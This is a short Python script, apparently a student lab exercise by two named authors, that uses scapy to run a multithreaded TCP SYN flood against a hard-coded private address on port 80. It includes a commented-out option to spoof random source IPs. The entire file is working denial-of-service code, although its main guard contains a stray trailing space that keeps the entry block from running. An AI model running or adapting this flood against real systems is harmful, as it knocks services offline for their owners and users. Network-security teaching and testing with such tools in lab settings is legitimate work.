"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

SYN Flood utils
"""
from scapy.all import *
import concurrent.futures
import sys
import time

def syn_flood(target_ip, target_port):
    # forge IP packet with target ip as the destination IP address
    ip = IP(dst=target_ip)
    # ip = IP(src=RandIP("10.2.0.1/24"), dst=target_ip) # with random IPs (spoofing)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # the flag "S" indicates the type SYN
    raw = Raw(b"A"*1024)
    packet = ip / tcp / raw

    send(packet, loop=1, verbose=0) # resend the packet several times


if __name__ == "__main__ ":
    target_ip = "10.12.0.10"
    target_port = 80

    start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
        futures = []
        for i in range(16):
            futures.append(executor.submit(
                syn_flood, target_ip, target_port))

        for future in concurrent.futures.as_completed(futures):
            if future.result():
                executor.shutdown(wait=False)
                print('Time taken :', time.time() - start_time)
                sys.exit(0)